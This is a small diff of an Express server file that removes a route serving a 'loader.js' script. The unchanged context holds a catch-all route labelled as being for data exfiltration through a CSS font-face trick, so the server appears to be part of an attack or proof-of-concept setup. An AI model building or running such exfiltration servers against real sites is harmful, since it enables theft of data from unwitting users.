@@ -14,25 +14,6 @@ if (!fs.existsSync(DATA_FOLDER)) {
 
 console.log(`🚀 Server starting on port ${PORT}`);
 
-// Serve loader.js when a client requests GET /loader.js
-app.get('/loader.js', (req, res) => {
-  const filePath = path.join(__dirname, 'axiom', 'loader.js');
-
-  res.sendFile(filePath, {
-    headers: {
-      'Content-Type': 'application/javascript'
-    }
-  }, (err) => {
-    if (err) {
-      if (err.code === 'ENOENT') {
-        res.status(404).send('File not found');
-      } else {
-        res.status(500).send('Error serving file');
-      }
-    }
-  });
-});
-
 
 // Catch-all route for data exfiltration (font-face trick)
 app.get('*', (req, res) => {
